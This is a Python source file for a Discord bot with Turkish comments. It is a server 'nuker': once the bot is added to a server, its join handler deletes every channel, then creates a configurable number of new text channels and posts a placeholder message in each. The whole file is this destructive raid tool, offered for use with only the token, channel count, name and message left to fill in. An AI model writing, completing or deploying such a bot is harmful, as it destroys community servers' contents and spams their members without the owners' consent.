import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

TOKEN = "TOKEN"  # Buraya botunuzun tokenini girin

@bot.event
async def on_ready():
    print(f"{bot.user} olarak giriş yaptı!")

@bot.event
async def on_guild_join(guild):
    print(f"{guild.name} sunucusuna eklendi! İşlem başlatılıyor...")

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{channel.name} silindi.")
        except Exception as e:
            print(f"{channel.name} silinemedi: {e}")

    for i in range(KANAL_SAYISI):  # KANAL_SAYISI değişkenini istediğiniz kadar kanal oluşturacak şekilde ayarlayın
        try:
            new_channel = await guild.create_text_channel("KANAL_ADI")
            await new_channel.send("GONDERILECEK MESAJ")
            print(f"{new_channel.name} oluşturuldu ve mesaj gönderildi.")
        except Exception as e:
            print(f"Kanal oluşturulamadı: {e}")

    print(f"{guild.name} işlemi tamamlandı.")

bot.run(TOKEN)
